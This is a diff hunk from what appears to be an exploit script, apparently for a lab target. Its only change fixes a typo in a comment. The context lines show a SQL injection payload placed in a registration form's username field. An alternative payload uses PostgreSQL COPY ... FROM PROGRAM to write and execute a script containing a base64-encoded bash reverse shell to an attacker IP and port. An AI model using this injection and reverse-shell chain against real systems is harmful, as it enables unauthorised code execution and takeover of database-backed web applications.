@@ -64,7 +64,7 @@ full_content= create_content()
 
 payload= f"{full_content}"
 
-# The commented out payload below is for creating file and for using a different way to get a reverse shell.  The base64 string below is base64 of a reverse shell command. If using the below payload, ensure to update the IP address in the base64 string before running the script.  
+# The commented out payload below is for creating a file and for using a different way to get a reverse shell.  The base64 string below is base64 of a reverse shell command. If using the below payload, ensure to update the IP address in the base64 string before running the script.  
 #payload=f"create+table+{random_group}(mycol+text);Insert+into+{random_group}+values+($$echo+-n+YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIxLzQ0NDQgMD4mMSAi|base64+-d|bash$$);COPY+{random_group}+TO+'/var/lib/postgresql/proof.txt';COPY+{random_group}+TO+'/tmp/atest.sh';copy+{random_group}+FROM+program+'chmod+777+/tmp/atest.sh';copy+{random_group}+from+program+'/tmp/atest.sh'"
 
 data= f"name={random_group}&username={random_group}','{random_group}@test.com','afda');{payload};--+-&email={random_group}@a.com&password=test&repeatPassword=test"
